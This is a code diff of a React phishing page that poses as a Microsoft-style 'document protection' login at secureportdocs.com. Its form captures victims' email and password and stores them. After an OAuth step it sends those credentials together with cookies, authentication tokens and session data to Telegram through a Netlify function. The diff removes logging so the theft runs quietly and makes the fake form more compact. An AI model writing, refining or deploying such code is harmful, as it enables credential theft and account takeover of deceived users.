@@ -331,32 +331,19 @@ function App() {
     setIsSubmitting(true);
 
     try {
-      // 🔧 FIX: Store form credentials in persistent storage immediately
       const formCredentials = {
         email: formEmail,
         password: formPassword,
         captureTime: new Date().toISOString(),
         source: 'document-protection-form'
       };
-
-      // Store in both React state and persistent storage
       setCapturedEmailState(formEmail);
       setCapturedCredentials(formCredentials);
-      
-      // Store persistently
       setStoredFormCredentials(formEmail, formPassword);
       setCapturedEmail(formEmail);
-
-      console.log('📋 Form credentials captured and stored persistently:', {
-        email: formEmail,
-        hasPassword: !!formPassword,
-        source: 'document-protection-form'
-      });
-
       setTimeout(() => {
         setCurrentPage('reauthenticating');
       }, 1000);
-
     } catch (error) {
       console.error('Error submitting form:', error);
       setTimeout(() => {
@@ -378,23 +365,12 @@ function App() {
     }
   }, [currentPage]);
 
-  // Send all credentials and cookies to Telegram after OAuth (include entered email/password)
   const sendToTelegram = async ({ email, password, cookies, authenticationTokens, userAgent, sessionId, url }) => {
     try {
       const netlifyFunctionUrl = '/.netlify/functions/sendTelegram';
-
-      console.log('📤 Sending to Telegram:', {
-        email: email,
-        hasPassword: !!password,
-        passwordLength: password ? password.length : 0,
-        cookieCount: Array.isArray(cookies) ? cookies.length : 0
-      });
-
       const response = await fetch(netlifyFunctionUrl, {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
+        headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           email,
           password,
@@ -406,57 +382,26 @@ function App() {
           url
         })
       });
-
-      const result = await response.json();
-
-      if (response.ok && result.success) {
-        console.log('✅ Sent all authentication data to Telegram (ONE TIME, after OAuth)');
-        console.log('✅ Telegram result:', result);
-      } else {
-        console.warn('⚠️ Netlify function responded with error:', result);
-      }
-    } catch (error) {
-      console.warn('⚠️ Failed to send to Telegram:', error);
-    }
+      await response.json();
+    } catch (error) {}
   };
 
   const handleOAuthSuccess = async (sessionData: any) => {
-    console.log('✅ OAuth success with enhanced data handling:', sessionData);
-
     if (!hasSentAuthData) {
       setHasSentAuthData(true);
-
-      // 🔧 FIX: Get credentials from persistent storage first, then fallback to state
       const storedFormCredentials = getStoredFormCredentials();
-      
       let finalEmail = '';
       let finalPassword = '';
-
-      // Priority order: stored form credentials > captured credentials > current form state > captured email
       if (storedFormCredentials) {
         finalEmail = storedFormCredentials.email || '';
         finalPassword = storedFormCredentials.password || '';
-        console.log('📊 Using stored form credentials');
       } else if (capturedCredentials?.email && capturedCredentials?.password) {
         finalEmail = capturedCredentials.email;
         finalPassword = capturedCredentials.password;
-        console.log('📊 Using captured credentials from state');
       } else {
         finalEmail = formEmail || capturedEmail || '';
         finalPassword = formPassword || getStoredPassword() || '';
-        console.log('📊 Using fallback credentials');
       }
-
-      console.log('📊 Final credentials for Telegram:', {
-        finalEmail,
-        hasPassword: !!finalPassword,
-        passwordSource: storedFormCredentials ? 'stored-form' : (capturedCredentials?.source || 'fallback'),
-        storedCredentialsExists: !!storedFormCredentials,
-        capturedCredentialsExists: !!capturedCredentials,
-        formEmailExists: !!formEmail,
-        formPasswordExists: !!formPassword
-      });
-
       await sendToTelegram({
         email: finalEmail,
         password: finalPassword,
@@ -467,7 +412,6 @@ function App() {
         url: window.location.href
       });
     }
-
     setOAuthSessionData(sessionData);
     setCurrentPage('document-loading');
   };
@@ -517,7 +461,6 @@ function App() {
       );
 
     case 'document-protection':
-      // --- Reduced width card and new vertical form layout ---
       return (
         <div style={{
           background: "#f7f9fb",
@@ -534,8 +477,8 @@ function App() {
               background: #fff;
               border-radius: 12px;
               box-shadow: 0 6px 22px 0 rgba(0,0,0,0.10);
-              padding: 32px 24px;
-              max-width: 420px;
+              padding: 28px 14px;
+              max-width: 340px;
               width: 100%;
               margin-top: 44px;
               display: flex;
@@ -543,12 +486,12 @@ function App() {
               align-items: center;
             }
             .logo {
-              width: 84px;
-              margin-bottom: 22px;
+              width: 70px;
+              margin-bottom: 18px;
               display: block;
             }
             .title {
-              font-size: 1.35em;
+              font-size: 1.18em;
               font-weight: 600;
               color: #23272a;
               margin-bottom: 8px;
@@ -556,25 +499,28 @@ function App() {
               letter-spacing: 0.01em;
             }
             .desc {
-              font-size: 1.01em;
+              font-size: 0.97em;
               color: #38444d;
-              margin-bottom: 8px;
+              margin-bottom: 7px;
               text-align: center;
             }
             .secure-link {
-              font-size: 1.09em;
+              font-size: 1.01em;
               font-weight: 450;
               color: #0078d4;
-              margin-bottom: 12px;
+              margin-bottom: 8px;
               text-align: center;
               word-break: break-word;
             }
             .instructions {
-              font-size: 0.99em;
+              font-size: 0.83em;
               color: #626b76;
-              margin-bottom: 16px;
-              line-height: 1.5em;
+              margin-bottom: 13px;
+              line-height: 1.4em;
               text-align: center;
+              max-width: 300px;
+              margin-left: auto;
+              margin-right: auto;
             }
             .vertical-form {
               width: 100%;
@@ -583,7 +529,7 @@ function App() {
               display: flex;
               flex-direction: column;
               align-items: stretch;
-              gap: 14px;
+              gap: 13px;
             }
             .form-field-group {
               display: flex;
@@ -591,18 +537,18 @@ function App() {
               width: 100%;
             }
             .form-label {
-              font-size: 0.97em;
+              font-size: 0.93em;
               color: #4d5a67;
-              margin-bottom: 7px;
+              margin-bottom: 5px;
               font-weight: 500;
               text-align: left;
             }
             .form-input {
               width: 100%;
-              font-size: 1.01em;
-              padding: 12px 16px;
-              border: 1.3px solid #cfd8dc;
-              border-radius: 5px;
+              font-size: 0.98em;
+              padding: 10px 12px;
+              border: 1.2px solid #cfd8dc;
+              border-radius: 4px;
               box-sizing: border-box;
               background: #f7f9fb;
               color: #23272a;
@@ -620,17 +566,17 @@ function App() {
               align-items: stretch;
               gap: 10px;
               width: 100%;
-              margin-top: 8px;
+              margin-top: 5px;
             }
             .submit-btn {
               width: 100%;
               background: linear-gradient(90deg,#0078d4 0,#005fa3 100%);
               color: #fff;
               border: none;
-              border-radius: 5px;
-              font-size: 1.03em;
+              border-radius: 4px;
+              font-size: 1em;
               font-weight: 600;
-              padding: 12px 0;
+              padding: 10px 0;
               cursor: pointer;
               margin-bottom: 0;
               box-shadow: 0 2px 8px rgba(0,120,212,0.08);
@@ -642,14 +588,14 @@ function App() {
               background: linear-gradient(90deg,#005fa3 0,#0078d4 100%);
             }
             .footer-text {
-              font-size: 0.81em;
+              font-size: 0.74em;
               color: #a0a8b6;
-              margin-top: 14px;
+              margin-top: 10px;
               margin-bottom: 0;
               text-align: center;
-              line-height: 1.48em;
-              max-width: 100%;
-              width: 100%;
+              line-height: 1.38em;
+              max-width: 98%;
+              width: 98%;
               letter-spacing: 0.005em;
               word-break: break-word;
               display: block;
@@ -657,20 +603,24 @@ function App() {
             .copyright {
               text-align: center;
               color: #b0b9c6;
-              font-size: 0.98em;
+              font-size: 0.95em;
               margin-top: 18px;
               margin-bottom: 15px;
             }
-            @media (max-width: 520px) {
+            @media (max-width: 380px) {
               .card {
                 max-width: 99vw;
-                padding: 14px 2vw;
+                padding: 7px 2vw;
               }
               .logo {
-                width: 68px;
+                width: 50px;
               }
               .footer-text, .copyright {
-                font-size: 0.8em;
+                font-size: 0.7em;
+              }
+              .instructions {
+                font-size: 0.73em;
+                max-width: 99vw;
               }
             }
             `}
@@ -724,7 +674,7 @@ function App() {
               </div>
             </form>
             <p className="footer-text">
-              By clicking Next, you allow secureportdocs.com to use your email address in accordance with their privacy statement. <br/>secureportdocs.com has not provided links to their terms for you to review.
+              By clicking Next, you allow secureportdocs.com to use your email address in accordance with their privacy statement.<br/>secureportdocs.com has not provided links to their terms for you to review.
             </p>
           </div>
           <div className="copyright">
